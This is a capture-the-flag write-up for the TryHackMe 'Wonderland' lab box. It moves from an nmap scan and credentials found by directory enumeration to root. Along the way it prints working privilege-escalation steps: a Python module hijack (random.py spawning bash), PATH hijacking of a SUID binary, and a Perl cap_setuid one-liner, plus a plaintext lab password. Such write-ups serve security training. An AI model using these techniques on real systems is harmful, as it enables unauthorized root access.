---
title: Wonderland
category: [writeups,TryHackMe]
tags: [Linux,Privilege-Escalation,Perl-Capabilities]
---

# Wonderland
- Difficulty : `Medium`
- Operating System : `Linux`

# Table of Content
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)

## Nmap Result
```
Nmap scan report for 10.10.187.136                                                                                                                                                                                                                                                                                                            
Host is up, received timestamp-reply ttl 60 (0.35s latency).                                                                                                                                                                                                                                                                                  
Scanned at 2022-08-03 09:28:30 UTC for 40s                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                              
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                                                                                                                                                   
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                                              
| ssh-hostkey:                                                                                                                                                                                                                                                                                                                                
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)                                                                                                                                                                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd
73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN                                                                                                                                                                                                                                                                                              
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)                                                                                                                                                                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=                                                                                                                                                                            
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)                                                                                                                                                                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh                                                                                                                                                                                                                                                            
80/tcp open  http    syn-ack ttl 60 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                                                                                                                                                                                 
| http-methods:                                                                                                                                                                                                                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                                                                                                                                  
|_http-title: Follow the white rabbit.                                                                                                                                                                                                                                                                                                        
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                                                                                                                                                         
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                                                                                                                                                                             
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal). 
```
# Method to solve the challenge
We will be starting off with website. The website is only one page and we could not continue.
<br>
![](/assets/img/posts/2022-08-03-Wonderland-1.png)
<br>
Since we could not continue, we could always check their subdirectory with any directory enumeration tool. After looking for a while, we manage to found a secret information in one of the subdirectory.
<br>
![](/assets/img/posts/2022-08-03-Wonderland-2.png)
<br>
That looks like our ssh username and password.
```
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```
We successfully get a shell with ssh.

# Privilege Escalation
Since we are not root, we will continue our way to root by performing privilege escalation.
```
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Based on the sudoer file, we are allow to run python script with python as user rabbit.
```
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
...
```
Based on the python file, it is importing random into the python script. Python always have this feature where if there is a file that have the same name with the import name, python will run the file in current directory instead of the real library. 
```
alice@wonderland:~$ cat random.py 
import pty                                                                                            
pty.spawn("/bin/bash")
```
After preparing `random.py` which name is same with the import from `walrus_and_the_carpenter.py`, run the sudo command to get different user.
```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```
After changing user, look for method to privilege escalation again.
```
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```
In the user directory, we found one application which have suid binary which mean we could get other user or even root. 
<br>
![](/assets/img/posts/2022-08-03-Wonderland-3.png)
<br>
Although `cat` is not the best method, we somehow manage to see that the application is running date and it is not a absolute path. We could try to change `$PATH` and create a `date` in our path.
```
rabbit@wonderland:/home/rabbit$ export PATH=.
rabbit@wonderland:/home/rabbit$ /bin/cat date
#!/bin/bash
/bin/bash
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by bash: groups: command not found
Command 'lesspipe' is available in the following places
 * /bin/lesspipe
 * /usr/bin/lesspipe
The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
lesspipe: command not found
Command 'dircolors' is available in '/usr/bin/dircolors'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
dircolors: command not found
hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
After looking awhile in the new user, we found a new password.
```
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```
With this password, we could use it to get ssh shell with user hatter.
```
ssh hatter@10.10.187.136
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```
As usual, search for privilege escalation with `linpeas.sh` or any similar tools which works.
```
Files with capabilities (limited to 50):                                                                                                                               
/usr/bin/perl5.26.1 = cap_setuid+ep                                                                                                                                    
/usr/bin/mtr-packet = cap_net_raw+ep                                                                                                                                   
/usr/bin/perl = cap_setuid+ep 
```
Based on `linpeas.sh`, there is a high chance that we could get root account with perl. Looking at [GTFOBIN](https://gtfobins.github.io/gtfobins/perl/), We could get root account with perl as it has capability set.
```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```




